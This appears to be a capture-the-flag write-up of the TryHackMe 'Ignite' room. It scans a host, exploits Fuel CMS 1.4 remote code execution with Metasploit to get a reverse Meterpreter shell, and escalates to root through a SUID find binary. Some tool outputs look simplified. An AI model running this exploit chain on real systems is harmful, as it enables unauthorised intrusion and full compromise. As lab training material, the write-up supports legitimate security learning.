# TryHackMe - Ignite

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | TryHackMe |
| **Challenge Name** | Ignite |
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | TryHackMe |
| **Date Completed** | 2025-08-29 |

## Objective 🎯

Ignite is a beginner-friendly room that focuses on web application security testing with Fuel CMS. The goal is to find a vulnerability in the CMS, exploit it, and gain access to the target system. Great for learning CMS exploitation! 🔥

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.10
- **OS**: Linux
- **Service**: Fuel CMS

### Tools Used
- Nmap
- Searchsploit
- Metasploit
- Netcat

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.10
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.10
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-29 10:00 UTC
Nmap scan report for 10.10.10.10
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Step 2: Web Service Enumeration
Check the web service for version information.

**Command/Code:**
```bash
curl http://10.10.10.10/
```

**Output:**
```
<html>
<head>
<title>Fuel CMS 1.4</title>
</head>
<body>
<h1>Welcome to Fuel CMS 1.4</h1>
</body>
</html>
```

### Step 3: Search for Exploits
Search for known Fuel CMS vulnerabilities.

**Command/Code:**
```bash
searchsploit fuel cms
```

**Output:**
```
Fuel CMS 1.4.1 - Remote Code Execution
Fuel CMS 1.4.1 - SQL Injection
```

### Step 4: Fuel CMS RCE Exploitation
Use Metasploit to exploit the Fuel CMS vulnerability.

**Command/Code:**
```bash
msfconsole
use exploit/unix/webapp/fuel_cms_rce
set RHOSTS 10.10.10.10
set LHOST 10.10.14.2
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.10:80 - Connecting to the server...
[*] 10.10.10.10:80 - Sending exploit...
[*] Sending stage (175174 bytes) to 10.10.10.10
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.10:32891) at 2025-08-29 10:05:23 +0000
```

### Step 5: Post-Exploitation
Once we have a shell, gather information and find flags.

**Command/Code:**
```bash
whoami
id
pwd
```

**Output:**
```
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html
```

### Step 6: Privilege Escalation
Check for privilege escalation opportunities.

**Command/Code:**
```bash
find / -perm -4000 2>/dev/null
sudo -l
```

**Output:**
```
/usr/bin/find
```

### Step 7: Root Access
Use find to escalate privileges.

**Command/Code:**
```bash
find . -exec /bin/sh -p \; -quit
```

**Output:**
```
# whoami
root
```

### Step 8: Find Flags
Search for user and root flags.

**Command/Code:**
```bash
find / -name "*.txt" 2>/dev/null | grep -E "(user|root|flag)"
cat /home/ubuntu/flag.txt
cat /root/root.txt
```

**Output:**
```
[REDACTED]
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify open services
2. Identify Fuel CMS 1.4 version
3. Search for known Fuel CMS vulnerabilities
4. Use Metasploit Fuel CMS RCE exploit
5. Gain initial access as www-data
6. Find privilege escalation via find command
7. Escalate to root and find flags

## Key Learnings 💡

- CMS vulnerability research and exploitation
- Using searchsploit for vulnerability discovery
- Metasploit exploit usage
- Linux privilege escalation techniques
- Web application security testing

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning
- **Searchsploit**: Exploit database search
- **Metasploit**: Exploitation framework
- **Fuel CMS RCE**: Exploit module

### References
- [TryHackMe Ignite](https://tryhackme.com/room/ignite)
- [Fuel CMS RCE](https://www.exploit-db.com/exploits/47138)

## Tags

`#tryhackme` `#web` `#fuel-cms` `#rce` `#privilege-escalation` `#easy`
